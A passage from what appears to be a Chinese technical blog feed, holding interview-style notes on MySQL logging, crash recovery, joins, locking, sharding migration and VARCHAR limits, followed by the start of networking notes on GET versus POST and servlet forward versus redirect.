<li>下一步的扫描是在第一次找到 MLOG_CHECKPOINT 基础之上进行的，该次扫描会把 redo log 解析到哈希表中，如果扫描完整个文件，哈希表还没有被填满，则不需要第三次扫描，直接进行recovery就结束。</li>
<li>最后是在第二次基础上进行的，第二次扫描把哈希表填满后，还有redo log 剩余，则需要循环进行扫描，哈希表满后立即进行 recovery，直到所有的redo log 被 apply 完为止。</li>
</ol>
<p>redo log全部被解析并且apply完成，整个 InnoDB recovery 的第一阶段也就结束了，在该阶段中，所有已经被记录到redo log但是没有完成数据刷盘的记录都被重新落盘。</p>
<p>然而，InnoDB单靠 redo log 的恢复是不够的，这样还是有可能会丢失数据(或者说造成主从数据不一致)。</p>
<p>因为在事务提交过程中，写 binlog 和写 redo log 提交是两个过程，写 binlog 在前而 redo 提交在后，如果 MySQL 写完 binlog 后，在 redo 提交之前发生了宕机，这样就会出现问题：binlog 中已经包含了该条记录，而 redo 没有持久化。binlog 已经落盘就意味着 slave 上可以 apply 该条数据，redo 没有持久化则代表了 master 上该条数据并没有落盘，也不能通过 redo 进行恢复。</p>
<p>这样就造成了主从数据的不一致，换句话说主上丢失了部分数据，那么MySQL又是如何保证在这样的情况下，数据还是一致的？这就需要进行第二阶段恢复。</p>
<h3 id="第二阶段-binlog和undo-log共同参与"><a href="#第二阶段-binlog和undo-log共同参与" class="headerlink" title="第二阶段 binlog和undo log共同参与"></a>第二阶段 binlog和undo log共同参与</h3><p>该阶段的恢复中，也被划分成两部分：第一部分，根据 binlog 获取所有可能没有提交事务的 xid 列表；第二部分，根据 undo 中的信息构造所有未提交事务链表，最后通过上面两部分协调判断事务是否可以提交。</p>
<p>MySQL 在第二阶段恢复的时候，先会去读取最后一个 binlog 文件的所有 event 信息，然后把 xid 保存到一个列表中，然后进行第二部分的恢复，如下：</p>
<p>InnoDB 当前版本有 128 个回滚段，每个回滚段中保存了 undo log 的位置指针，通过扫描 undo 日志，可以构造出还未被提交的事务链表（存在于 insert_undo_list 和 update_undo_lsit 中的事务都是未被提交的），所以通过起始页（0，5）下的solt 信息可以定位到回滚段，然后根据回滚段下的 undo 的 slot 定位到 undo 页，把所有的 undo 信息构建一个 undo_list，然后通过 undo_list 再创建未提交事务链表 trx_sys-&gt;trx_list。</p>
<p>基于上面两步，已经构建了 xid 列表和未提交事务列表，那么在这些未提交事务列表中的事务，哪些需要被提交？哪些又该回滚？</p>
<p>判断条件很简单：凡是 xid 在通过 binlog 构建的xid列表中存在的事务，都需要被提交。换句话说，所有已经记录 binlog 的事务，需要被提交，而剩下那些没有记录 binlog 的事务，则需要被回滚。</p>
<h1 id="33-MySQL的日志类型"><a href="#33-MySQL的日志类型" class="headerlink" title="33. MySQL的日志类型"></a>33. MySQL的日志类型</h1><p>MySQL 中有六种日志文件，分别是：重做日志（redo log）、回滚日志（undo log）、二进制日志（binlog）、错误日志（errorlog）、慢查询日志（slow query log）、一般查询日志（general log），中继日志（relay log）。</p>
<p>其中重做日志和回滚日志与事务操作息息相关，二进制日志也与事务操作有一定的关系。</p>
<h2 id="redo-log"><a href="#redo-log" class="headerlink" title="redo log"></a>redo log</h2><p><strong>作用</strong>：确保事务的持久性。防止在发生故障的时间点，尚有脏页未写入磁盘，在重启 mysql 服务的时候，根据redo log进行重做，从而达到事务的持久性这一特性。</p>
<p><strong>内容</strong>：物理格式的日志，记录的是物理数据页面的修改的信息，其 redo log 是顺序写入redo log file 的物理文件中去的。</p>
<p><strong>什么时候产生</strong>：事务开始之后就产生 redo log，redo log 的落盘并不是随着事务的提交才写入的，而是在事务的执行过程中，便开始写入 redo log 文件中。</p>
<p><strong>什么时候释放</strong>：当对应事务的脏页写入到磁盘之后，redo log 的使命也就完成了，重做日志占用的空间就可以重用（被覆盖）。</p>
<p><strong>对应的物理文件</strong>：默认情况下，对应的物理文件位于数据库的 data 目录下的 <code>ib_logfile1&amp;ib_logfile2</code></p>
<ul>
<li><code>innodb_log_group_home_dir</code>:指定日志文件组所在的路径，默认<code>./</code> ，表示在数据库的数据目录下。</li>
<li><code>innodb_log_files_in_group</code>:指定重做日志文件组中文件的数量，默认2</li>
</ul>
<p>关于文件的大小和数量，由一下两个参数配置</p>
<ul>
<li><code>innodb_log_file_size</code>:重做日志文件的大小。</li>
<li><code>innodb_mirrored_log_groups</code> :指定了日志镜像文件组的数量，默认1</li>
</ul>
<p>很重要一点，redo log是什么时候写盘的？前面说了是在事物开始之后逐步写盘的。</p>
<p>之所以说重做日志是在事务开始之后逐步写入重做日志文件，而不一定是事务提交才写入重做日志缓存，原因就是，重做日志有一个缓存区 <code>Innodb_log_buffer</code>，<code>Innodb_log_buffer</code> 的默认大小为8M,Innodb 存储引擎先将重做日志写入 <code>innodb_log_buffer</code>中。</p>
<p>然后会通过以下三种方式将 innodb 日志缓冲区的日志刷新到磁盘:<br>1，Master Thread 每秒一次执行刷新 Innodb_log_buffer 到重做日志文件。<br>2，每个事务提交时会将重做日志刷新到重做日志文件。<br>3，当重做日志缓存可用空间少于一半时，重做日志缓存被刷新到重做日志文件</p>
<p>由此可以看出，重做日志通过不止一种方式写入到磁盘，尤其是对于第一种方式，<code>Innodb_log_buffer</code>到重做日志文件是Master Thread线程的定时任务。</p>
<p>因此重做日志的写盘，并不一定是随着事务的提交才写入重做日志文件的，而是随着事务的开始，逐步开始的。</p>
<p>另外引用《MySQL技术内幕 Innodb 存储引擎》（page37）上的原话：</p>
<blockquote>
<p>即使某个事务还没有提交，Innodb存储引擎仍然每秒会将重做日志缓存刷新到重做日志文件。</p>
</blockquote>
<p>这一点是必须要知道的，因为这可以很好地解释再大的事务的提交（commit）的时间也是很短暂的。</p>
<h2 id="回滚日志（undo-log）"><a href="#回滚日志（undo-log）" class="headerlink" title="回滚日志（undo log）"></a>回滚日志（undo log）</h2><p><strong>作用</strong>：保存了事务发生之前的数据的一个版本，可以用于回滚，同时可以提供多版本并发控制下的读（MVCC），也即非锁定读</p>
<p><strong>内容</strong>：逻辑格式的日志，在执行 undo 的时候，仅仅是将数据从逻辑上恢复至事务之前的状态，而不是从物理页面上操作实现的，这一点是不同于 redo log的。</p>
<p><strong>什么时候产生</strong>：事务开始之前，将当前的版本生成 undo log，undo 也会产生 redo 来保证 undo log 的可靠性</p>
<p><strong>什么时候释放</strong>：当事务提交之后，undo log并不能立马被删除，而是放入待清理的链表，由 purge 线程判断是否由其他事务在使用 undo 段中表的上一个事务之前的版本信息，决定是否可以清理undo log的日志空间。</p>
<p>另外, 在回滚段中的 undo logs 分为:insert undo log和update undo log</p>
<ul>
<li>insert undo log:事务对 insert 新记录时产生的 undolog,只在事务回滚时需要, 并且在事务提交后就可以立即丢弃。</li>
<li>update undo log:事务对记录进行 delete 和 update 操作时产生的 undo log,不仅在事务回滚时需要,一致性读也需要，所以不能随便删除，只有当数据库所使用的快照中不涉及该日志记录，对应的回滚日志才会被 purge 线程删除。</li>
</ul>
<p><strong>对应的物理文件</strong>：MySQL5.6之前，undo 表空间位于共享表空间的回滚段中，共享表空间的默认的名称是 ibdata，位于数据文件目录中。</p>
<p>MySQL5.6之后，undo 表空间可以配置成独立的文件，但是提前需要在配置文件中配置，完成数据库初始化后生效且不可改变 undo log 文件的个数</p>
<p>如果初始化数据库之前没有进行相关配置，那么就无法配置成独立的表空间了。</p>
<p>关于MySQL5.7之后的独立undo 表空间配置参数如下</p>
<ul>
<li><code>innodb_undo_directory = /data/undospace/ –undo</code> : 独立表空间的存放目录</li>
<li><code>innodb_undo_logs = 128</code>:回滚段为128KB</li>
<li><code>innodb_undo_tablespaces = 4</code>: 指定有4个undo log文件</li>
</ul>
<p>如果undo使用的共享表空间，这个共享表空间中又不仅仅是存储了 undo 的信息，共享表空间的默认为与 MySQL 的数据目录下面，其属性由参数 <code>innodb_data_file_path</code> 配置。</p>
<p>undo 是在事务开始之前保存的被修改数据的一个版本，产生 undo 日志的时候，同样会伴随类似于保护事务持久化机制的redolog 的产生。</p>
<p>默认情况下 undo 文件是保持在共享表空间的，也即 ibdatafile 文件中，当数据库中发生一些大的事务性操作的时候，要生成大量的 undo 信息，全部保存在共享表空间中的。</p>
<p>因此共享表空间可能会变的很大，默认情况下，也就是 undo 日志使用共享表空间的时候，被“撑大”的共享表空间是不会也不能自动收缩的。</p>
<p>因此，mysql5.7之后的“独立undo 表空间”的配置就显得很有必要了。</p>
<h2 id="二进制日志（binlog）"><a href="#二进制日志（binlog）" class="headerlink" title="二进制日志（binlog）"></a>二进制日志（binlog）</h2><p><strong>作用</strong>：用于复制，在主从复制中，从库利用主库上的 binlog 进行重播，实现主从同步；用于数据库的基于时间点的还原；</p>
<p><strong>内容</strong>：逻辑格式的日志，可以简单认为就是执行过的事务中的 sql 语句。但又不完全是sql语句这么简单，而是包括了执行的 sql 语句（增删改）反向的信息，也就意味着 delete 对应着 delete 本身和其反向的 insert；update 对应着 update 执行前后的版本的信息；insert 对应着 delete 和 insert 本身的信息。</p>
<p>因此可以基于 binlog 做到类似于 oracle的闪回功能，其实都是依赖于binlog中的日志记录。</p>
<p><strong>什么时候产生</strong>：事务提交的时候，一次性将事务中的 sql 语句（一个事物可能对应多个sql语句）按照一定的格式记录到 binlog 中。这里与 redo log 很明显的差异就是 redo log 并不一定是在事务提交的时候刷新到磁盘，redo log 是在事务开始之后就开始逐步写入磁盘。</p>
<p>因此对于事务的提交，即便是较大的事务，提交（commit）都是很快的，但是在开启了 bin_log 的情况下，对于较大事务的提交，可能会变得比较慢一些。</p>
<p>这是因为 binlog 是在事务提交的时候一次性写入的造成的，这些可以通过测试验证。</p>
<p><strong>什么时候释放</strong>：binlog 的默认是保持时间由参数 expire_logs_days 配置，也就是说对于非活动的日志文件，在生成时间超过 expire_logs_days 配置的天数之后，会被自动删除。</p>
<p><strong>对应的物理文件</strong>：配置文件的路径为 <code>log_bin_basename</code>，binlog 日志文件按照指定大小，当日志文件达到指定的最大的大小之后，进行滚动更新，生成新的日志文件。</p>
<p>对于每个binlog日志文件，通过一个统一的 index 文件来组织。</p>
<p>二进制日志的作用之一是还原数据库的，这与redo log很类似，很多人混淆过，但是两者有本质的不同：</p>
<ul>
<li>作用不同：redo log 是保证事务的持久性的，是事务层面的，binlog 作为还原的功能，是数据库层面的（当然也可以精确到事务层面的），虽然都有还原的意思，但是其保护数据的层次是不一样的。</li>
<li>内容不同：redo log 是物理日志，是数据页面的修改之后的物理记录，binlog 是逻辑日志，可以简单认为记录的就是sql语句</li>
</ul>
<p>另外，两者日志产生的时间，可以释放的时间，在可释放的情况下清理机制，都是完全不同的。</p>
<p>恢复数据时候的效率，基于物理日志的 redo log 恢复数据的效率要高于语句逻辑日志的 binlog</p>
<p>关于事务提交时，redo log 和 binlog 的写入顺序，为了保证主从复制时候的主从一致（当然也包括使用binlog进行基于时间点还原的情况），是要严格一致的，MySQL通过两阶段提交过程来完成事务的一致性的，也即 redo log 和 binlog 的一致性的，理论上是先写 redo log，再写 binlog，两个日志都提交成功（刷入磁盘），事务才算真正的完成。</p>
<h1 id="34-MySQL-外连接查询（左外连接和右外连接）"><a href="#34-MySQL-外连接查询（左外连接和右外连接）" class="headerlink" title="34. MySQL 外连接查询（左外连接和右外连接）"></a>34. MySQL 外连接查询（左外连接和右外连接）</h1><h2 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h2><p>关键字：<code>inner join on</code></p>
<p>语句：<code>select * from a_table a inner join b_table b on a.a_id = b.b_id;</code></p>
<p>说明：组合两个表中的记录，返回关联字段相符的记录，也就是返回两个表的交集（阴影）部分。</p>
<h2 id="左-外-连接"><a href="#左-外-连接" class="headerlink" title="左(外)连接"></a>左(外)连接</h2><p>关键字：<code>left join on / left outer join on</code></p>
<p>语句：<code>select * from a_table a left join b_table bon a.a_id = b.b_id;</code></p>
<p>说明：<code>left join</code> 是 <code>left outer join</code> 的简写，它的全称是左外连接，是外连接中的一种。左(外)连接，左表(a_table)的记录将会全部表示出来，而右表(b_table)只会显示符合搜索条件的记录。右表记录不足的地方均为NULL。</p>
<h2 id="右（外）连接"><a href="#右（外）连接" class="headerlink" title="右（外）连接"></a>右（外）连接</h2><p>关键字：<code>right join on / right outer join on</code></p>
<p>语句：<code>select * from a_table a right outer join b_table b on a.a_id = b.b_id;</code></p>
<p>说明：<code>right join</code> 是 <code>right outer join</code> 的简写，它的全称是右外连接，是外连接中的一种。与左(外)连接相反，右(外)连接，左表(a_table)只会显示符合搜索条件的记录，而右表(b_table)的记录将会全部表示出来。左表记录不足的地方均为NULL。</p>
<p>各种关联查询结果如图：</p>
<p><img src="http://qiniu.xiaoming.net.cn/SQL%E8%BF%9E%E6%8E%A5%E6%9F%A5%E8%AF%A2.jpg" alt="SQL连接查询"></p>
<blockquote>
<p>MySQL目前不支持全外连接。</p>
</blockquote>
<h1 id="35-不使用事务的话会产生死锁吗？"><a href="#35-不使用事务的话会产生死锁吗？" class="headerlink" title="35. 不使用事务的话会产生死锁吗？"></a>35. 不使用事务的话会产生死锁吗？</h1><p>会。</p>
<p>事务产生的死锁是由于：</p>
<p>一个用户A 访问表 A（锁住了表 A），然后又访问表 B；另一个用户 B 访问表 B（锁住了表 B），然后企图访问表 A；这时用户 A 由于用户 B 已经锁住表B，它必须等待用户 B 释放表 B 才能继续，同样用户 B 要等用户 A 释放表 A 才能继续，这就死锁就产生了。</p>
<p>并发修改也可能会产生：</p>
<p>用户 A 查询一条纪录，然后修改该条纪录。</p>
<p>这时用户 B 修改该条纪录。</p>
<p>由于此时用户 A 的事务里锁的性质由查询的共享锁企图上升到独占锁，而用户 B 里的独占锁由于 A 有共享锁存在，所以必须等 A 释放掉共享锁，而 A 由于 B 的独占锁而无法上升的独占锁也就不可能释放共享锁，于是出现了死锁。这种死锁由于比较隐蔽，但在稍大点的项目中经常发生。</p>
<h1 id="36-数据库乐观锁悲观锁具体是什么，写一个典型的乐观锁SQL语句，有什么需要注意的问题？"><a href="#36-数据库乐观锁悲观锁具体是什么，写一个典型的乐观锁SQL语句，有什么需要注意的问题？" class="headerlink" title="36. 数据库乐观锁悲观锁具体是什么，写一个典型的乐观锁SQL语句，有什么需要注意的问题？"></a>36. 数据库乐观锁悲观锁具体是什么，写一个典型的乐观锁SQL语句，有什么需要注意的问题？</h1><ul>
<li>乐观锁：每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在提交更新的时候会判断一下在此期间别人有没有去更新这个数据。乐观锁适用于读多写少的应用场景，这样可以提高吞吐量。它假设不会发生并发冲突，只在提交操作时检查是否违反数据完整性。</li>
<li>悲观锁：每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会 block 直到它拿到锁。它假定会发生并发冲突，屏蔽一切可能违反数据完整性的操作。</li>
</ul>
<p>乐观锁一般来说有以下2种方式：</p>
<ul>
<li>使用数据版本（Version）记录机制实现，这是乐观锁最常用的一种实现方式。何谓数据版本？即为数据增加一个版本标识，一般是通过为数据库表增加一个数字类型的 <code>version</code> 字段来实现。当读取数据时，将 <code>version</code> 字段的值一同读出，数据每更新一次，对此 <code>version</code> 值加一。当我们提交更新的时候，判断数据库表对应记录的当前版本信息与第一次取出来的 <code>version</code> 值进行比对，如果数据库表当前版本号与第一次取出来的 <code>version</code> 值相等，则予以更新，否则认为是过期数据。</li>
<li>使用时间戳（timestamp）。乐观锁定的第二种实现方式和第一种差不多，同样是在需要乐观锁控制的 <code>table</code> 中增加一个字段，名称无所谓，字段类型使用时间戳（timestamp）, 和上面的 <code>version</code> 类似，也是在更新提交的时候检查当前数据库中数据的时间戳和自己更新前取到的时间戳进行对比，如果一致则OK，否则就是版本冲突。</li>
</ul>
<p>悲观锁和乐观锁选用：</p>
<ol>
<li>悲观锁使用了排他锁，当程序独占锁时，其他程序就连查询都是不允许的，导致吞吐较低。如果在查询较多的情况下，可使用乐观锁。</li>
<li>乐观锁更新有可能会失败，甚至是更新几次都失败，这是有风险的。所以如果写入较频繁，对吞吐要求不高，可使用悲观锁。</li>
</ol>
<p>也就是一句话：读用乐观锁，写用悲观锁。</p>
<h1 id="37-如何设计才可以让系统从未分库分表动态切换到分库分表上？"><a href="#37-如何设计才可以让系统从未分库分表动态切换到分库分表上？" class="headerlink" title="37. 如何设计才可以让系统从未分库分表动态切换到分库分表上？"></a>37. 如何设计才可以让系统从未分库分表动态切换到分库分表上？</h1><h2 id="停机迁移方案"><a href="#停机迁移方案" class="headerlink" title="停机迁移方案"></a>停机迁移方案</h2><p>有一个实现比较简单的方案，大家伙儿凌晨 12 点开始运维，网站或者 app 挂个公告，说 0 点到早上 6 点进行运维，无法访问。</p>
<p>接着到 0 点停机，系统停掉，没有流量写入了，此时老的单库单表数据库静止了。然后之前得写好一个导数据的一次性工具，此时直接跑起来，然后将单库单表的数据哗哗哗读出来，写到分库分表里面去。</p>
<p>导数完了之后，就 ok 了，修改系统的数据库连接配置啥的，包括可能代码和 SQL 也许有修改，那你就用最新的代码，然后直接启动连到新的分库分表上去。</p>
<p>验证一下就 OK 了。</p>
<p><img src="http://qiniu.xiaoming.net.cn/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%E6%96%B9%E6%A1%881.png" alt="停机迁移方案"></p>
<h2 id="双写迁移方案"><a href="#双写迁移方案" class="headerlink" title="双写迁移方案"></a>双写迁移方案</h2><p>简单来说，就是在线上系统里面，之前所有写库的地方，增删改操作，除了对老库增删改，都加上对新库的增删改，这就是所谓的双写，同时写俩库，老库和新库。</p>
<p>然后系统部署之后，新库数据差太远，用之前说的导数工具，跑起来读老库数据写新库，写的时候要根据 gmt_modified 这类字段判断这条数据最后修改的时间，除非是读出来的数据在新库里没有，或者是比新库的数据新才会写。简单来说，就是不允许用老数据覆盖新数据。</p>
<p>导完一轮之后，有可能数据还是存在不一致，那么就程序自动做一轮校验，比对新老库每个表的每条数据，接着如果有不一样的，就针对那些不一样的，从老库读数据再次写。反复循环，直到两个库每个表的数据都完全一致为止。</p>
<p>接着当数据完全一致了，就 ok 了，基于仅仅使用分库分表的最新代码，重新部署一次，不就仅仅基于分库分表在操作了么，还没有几个小时的停机时间，很稳。所以现在基本数据迁移之类的，都是这么干的。</p>
<p><img src="http://qiniu.xiaoming.net.cn/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%E6%96%B9%E6%A1%882.png" alt="双写迁移方案"></p>
<h1 id="38-DELETE-和-DROP-区别"><a href="#38-DELETE-和-DROP-区别" class="headerlink" title="38. DELETE 和 DROP 区别"></a>38. DELETE 和 DROP 区别</h1><p>delete 删除表的数据，但保留表的结构。<br>drop 直接把整个表删除，执行完 drop 之后，表不存在。</p>
<h1 id="39-数据库中视图的应用场景，数据库数据改变视图中的数据是否会改变"><a href="#39-数据库中视图的应用场景，数据库数据改变视图中的数据是否会改变" class="headerlink" title="39. 数据库中视图的应用场景，数据库数据改变视图中的数据是否会改变"></a>39. 数据库中视图的应用场景，数据库数据改变视图中的数据是否会改变</h1><p>视图是基于 SQL 语句的结果集的可视化的表。</p>
<p>视图包含行和列，就像一个真实的表。视图中的字段就是来自一个或多个数据库中的真实的表中的字段。视图并不在数据库中以存储的数据值集形式存在，而是存在于实际引用的数据库表中，视图的构成可以是单表查询，多表联合查询，分组查询以及计算(表达式)查询等。行和列数据来自由定义视图的查询所引用的表，并且在引用视图时动态生成。</p>
<p>视图应用场景：</p>
<ul>
<li>权限控制的时候。当用户需要查询未授权的数据表且又需要部分数据表的部分列进行逻辑处理，不希望用户访问表中某些含敏感信息的列。</li>
<li>关键信息来源于多个复杂关联表，可以创建视图提取我们需要的信息，简化操作；</li>
<li>简化用户操作，视图不仅可以简化用户对数据的理解，也可以简化他们的操作。</li>
</ul>
<p>数据库中只存放了视图的定义，而没有存放视图中的数据，这些数据存放在原来的表中。</p>
<p>使用视图查询数据时，数据库系统会从原来的表中取出对应的数据。</p>
<p><strong>视图中的数据依赖于原来表中的数据，一旦表中数据发生改变，显示在视图中的数据也会发生改变</strong>。</p>
<p>当用户试图修改视图的某些信息时，数据库必须把它转化为对基本表的某些信息的修改，对于单表的视图来说，这是很方便的。但是，对于比较复杂的视图，可能是不可修改的。</p>
<h1 id="40-MySQL-数据库机器配置规划"><a href="#40-MySQL-数据库机器配置规划" class="headerlink" title="40. MySQL 数据库机器配置规划"></a>40. MySQL 数据库机器配置规划</h1><p>一般 Java 应用系统部署在 4 核 8G 的机器上，每秒抗 500 左右的并发量是 ok 的，数据库至少选用 8 核 16 G 以上的机器，一般每秒可以扛一两千并发请求。</p>
<h1 id="42-编写-sql-语句"><a href="#42-编写-sql-语句" class="headerlink" title="42. 编写 sql 语句"></a>42. 编写 sql 语句</h1><ol>
<li><p>统计数据表中某一列出现的次数，并按从大到小排列，sql 语句怎么写？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT name,count(name) FROM t_table GROUP BY name;</span><br></pre></td></tr></table></figure>
</li>
<li><p>给你一整个小学的数据，一条命令返回每个年级每个班的总人数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT COUNT(number),&#96;class&#96;, &#96;grade&#96; FROM student GROUP BY class,grade;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="43-count（-），count（字段名），count（1）-区别？"><a href="#43-count（-），count（字段名），count（1）-区别？" class="headerlink" title="43. count（*），count（字段名），count（1） 区别？"></a>43. count（*），count（字段名），count（1） 区别？</h1><p>执行效果上：</p>
<ul>
<li><code>count(*)</code> 包括了所有的列，相当于行数，在统计结果的时候，不会忽略列值为NULL</li>
<li><code>count(1)</code> 包括了忽略所有列，用 固定值1 代表代码行，在统计结果的时候，不会忽略列值为NULL</li>
<li><code>count(列名)</code> 只包括列名那一列，在统计结果的时候，会忽略列值为空（这里的空不是只空字符串或者0，而是表示null）的计数，即某个字段值为NULL时，不统计。</li>
</ul>
<p>执行效率上：</p>
<ul>
<li>列名为主键，count(列名) 会比 count(1)快</li>
<li>列名不为主键，count(1) 会比 count(列名) 快</li>
<li>如果表多个列并且没有主键，则 count（1） 的执行效率优于 count（*）</li>
<li>如果有主键，则 <code>select count（主键）</code>的执行效率是最优的</li>
<li>如果表只有一个字段，则 select count（*）最优。</li>
</ul>
<h1 id="44-Varchar-的最大长度以及超长问题"><a href="#44-Varchar-的最大长度以及超长问题" class="headerlink" title="44. Varchar 的最大长度以及超长问题"></a>44. Varchar 的最大长度以及超长问题</h1><p>4.0版本以下，varchar(20)，指的是20字节，如果存放UTF8汉字时，只能存6个（每个汉字3字节）</p>
<p>5.0版本以上，varchar(20)，指的是20字符，无论存放的是数字、字母还是UTF8汉字（每个汉字3字节），都可以存放20个，最大大小是65532字节</p>
<p>varchar 最多能存储 65535 个字节的数据。varchar 的最大长度受限于最大行长度（max row size，65535 bytes）。65535 并不是一个很精确的上限，可以继续缩小这个上限。65535 个字节包括所有字段的长度，变长字段的长度标识（每个变长字段额外使用 1 或者 2 个字节记录实际数据长度）、NULL 标识位的累计。</p>
<blockquote>
<p>NULL 标识位，如果 varchar 字段定义中带有 default null 允许列空,则需要需要 1bit 来标识，每 8 个 bits 的标识组成一个字段。一张表中存在 N 个 varchar 字段，那么需要（N+7）/8 （取整） bytes 存储所有的 NULL 标识位。</p>
</blockquote>
<blockquote>
<p>因为varchar类型存储变长字段的字符类型，其存储时需要在前缀长度列表加上实际存储的字符，当存储的字符串长度小于255字节时，其需要 1 字节的空间，当大于 255 字节时，需要 2 字节的空间。</p>
</blockquote>
<p>如果数据表只有一个 varchar 字段且该字段 DEFAULT NULL 并且大于 255 字节，那么该 varchar 字段的最大长度为 65532 个字节，即 65535-2-1=65532 byte。</p>
<p>所以具有以下规则：</p>
<p><strong>编码长度限制</strong>：</p>
<ul>
<li>字符类型若为gbk，每个字符最多占 2个字节，最大长度不能超过32766;</li>
<li>字符类型若为utf8，每个字符最多占 3 个字节，最大长度不能超过21845。</li>
<li>若定义的时候超过上述限制，则 varchar 字段会被强行转为 text 类型，并产生 warning。</li>
</ul>
<p><strong>行长度限制</strong>：</p>
<p>导致实际应用中 varchar 长度限制的是一个行定义的长度。 MySQL 要求一个行的定义长度不能超过 65535。若定义的表长度超过这个值，则提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ERROR 1118 (42000): Row size too large. The maximum row size for the used table type, not counting BLOBs, is 65535. You have to change some columns to TEXT or BLOBs。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络</title>
    <url>/2021/02/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<h1 id="1-get请求和post请求的区别"><a href="#1-get请求和post请求的区别" class="headerlink" title="1. get请求和post请求的区别"></a>1. get请求和post请求的区别</h1><p>在实际应用中，<code>get</code>和<code>post</code>请求的区别主要有以下几个：</p>
<ul>
<li><code>get</code>请求用于从服务器上获得资源，而<code>post</code>请求用于向服务器提交数据</li>
<li><code>get</code>将表单中的数据按照<code>key=value</code>的形式，添加到<code>action</code>指定的URL后面，并且两者之间使用<code>?</code>连接，各个变量之间使用<code>&amp;</code>连接；<code>post</code>是将表单的数据放在HTTP协议的请求头或者消息体中，传递到<code>action</code>所指向的URL</li>
<li><code>get</code>传输的数据要受到URL长度的限制（最大长度是2048个字符）；而<code>post</code>可以传输大量数据，上传文件通常使用<code>post</code></li>
<li>使用<code>get</code>时参数会显示在地址栏上，如果这些数据不是敏感数据，那么可以使用<code>get</code>，对于敏感数据应使用<code>post</code></li>
<li><code>get</code>使用<code>MIME</code>类型<code>application/x-www-form-urlencoded</code>的URL编码（也叫百分号编码）文本格式传递参数，保证被传送的参数由遵循规范的文本组成，例如一个空格的编码是<code>%20</code></li>
<li><code>get</code>请求参数会被完整保留在浏览器历史记录里，而<code>post</code>中的参数不会被保留。</li>
</ul>
<a id="more"></a>

<p>但是在本质上，<strong>get和post请求没有区别</strong></p>
<p><code>get</code>和<code>post</code>是HTTP协议中的两种发送请求的方法，而HTTP是基于<code>TCP/IP</code>的关于数据如何在万维网中如何通信的协议。因此，<code>get</code>和<code>post</code>的底层也是<code>TCP/IP</code>,也就是说，<code>get</code>和<code>post</code>都是<code>TCP</code>链接，它们能做的事情其实是一样的，要让<code>get</code>做<code>post</code>的事，或者让<code>post</code>做<code>get</code>的事，技术上都是可以实现的。只是由于HTTP的规定和浏览器/服务器的限制，导致他们在应用过程中体现出一些不同。</p>
<p>此外，<code>get</code>和<code>post</code>还有一个重要的区别：<br><strong>get产生一个TCP数据包；POST产生两个TCP数据包</strong>。</p>
<p>对于<code>get</code>方式的请求，浏览器会把<code>http header</code>和<code>data</code>一并发送出去，服务器响应<code>200</code>（返回数据）；</p>
<p>而对于<code>post</code>，浏览器先发送header，服务器响应<code>100 continue</code>，浏览器再发送<code>data</code>，服务器响应<code>200 ok</code>（返回数据）。</p>
<blockquote>
<p>因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑！跳入需谨慎。为什么？</p>
<ol>
<li>GET与POST都有自己的语义，不能随便混用。</li>
<li>据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。</li>
<li>并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。</li>
</ol>
</blockquote>
<h1 id="2-转发和重定向的区别"><a href="#2-转发和重定向的区别" class="headerlink" title="2. 转发和重定向的区别"></a>2. 转发和重定向的区别</h1><p><strong>转发是服务端行为，重定向是客户端行为</strong>。</p>
<ul>
<li>从地址栏来说：<code>forward</code>是服务器请求资源,服务器直接访问目标地址的URL,把那个URL的响应内容读取过来,然后把这些内容再发给浏览器.浏览器根本不知道服务器发送的内容从哪里来的,所以它的地址栏还是原来的地址. <code>redirect</code>是服务端根据逻辑,发送一个状态码,告诉浏览器重新去请求那个地址.所以地址栏显示的是新的URL.</li>
<li>从数据共享来说：<code>forward</code>转发页面和转发到的页面可以共享<code>request</code>里面的数据，而<code>redirect</code>不能共享数据</li>
<li>从运用的地方来说：<code>forward</code>一般用于用户登陆的时候,根据角色转发到相应的模块；<code>redirect</code>一般用于用户注销登陆时返回主页面和跳转到其它的网站等。</li>
<li>从效率来说：<code>forward</code>高，<code>redirect</code>低</li>
</ul>
<h2 id="java中转发和重定向的实现："><a href="#java中转发和重定向的实现：" class="headerlink" title="java中转发和重定向的实现："></a>java中转发和重定向的实现：</h2><p><strong>转发</strong>通过<code>RequestDispatcher</code>对象的<code>forward(HttpServletRequest request,HttpServletResponse response)</code>方法实现，<code>RequestDispatcher</code>可以通过<code>HttpServletRequest</code> 的<code>getRequestDispatcher()</code>方法获得。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//转发，应该使用request，因为是在请求的时候进行转发</span></span><br><span class="line"><span class="comment">//获取转发器</span></span><br><span class="line">RequestDispatcher requestDispatcher = request.getRequestDispatcher(<span class="string">&quot;/ListServlet&quot;</span>);<span class="comment">//在服务器端，/表示web目录</span></span><br><span class="line"><span class="comment">//转发</span></span><br><span class="line">requestDispatcher.forward(request,response);<span class="comment">//使用转发浏览器的url不会改变</span></span><br></pre></td></tr></table></figure>

<p><strong>重定向</strong>通过<code>HttpServletResponse</code>的<code>setStatus(int status)</code>方法设置状态码。如果服务器返回301或者302，则浏览器会到新的网址重新请求该资源。通过<code>response.sendRedirect(&quot;info.html&quot;)</code>指定跳转路径。</p>
